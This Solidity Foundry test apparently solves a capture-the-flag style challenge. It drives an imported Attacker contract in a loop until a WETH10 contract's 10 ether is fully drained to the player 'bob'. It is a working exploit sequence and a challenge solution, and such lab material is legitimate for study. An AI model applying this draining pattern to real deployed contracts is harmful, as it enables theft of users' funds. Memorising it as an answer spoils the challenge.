// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts/interfaces/IERC20.sol";

import "../src/WETH10.sol";
import "../src/attackers/WETH10Attacker.sol";

contract Weth10Test is Test {
    WETH10 public weth;
    Attacker attacker;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH10();
        bob = makeAddr("bob");
        attacker = new Attacker(weth, bob);

        vm.deal(address(weth), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(
            address(weth).balance,
            10 ether,
            "weth contract should have 10 ether"
        );

        vm.startPrank(bob);

        weth.deposit{value: 1 ether}();
        weth.transfer(address(attacker), 1 ether);

        while (address(weth).balance != 0) {
            attacker.attack();
            weth.transfer(address(attacker), 1 ether);
        }

        attacker.withdraw();

        vm.stopPrank();
        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
    }
}
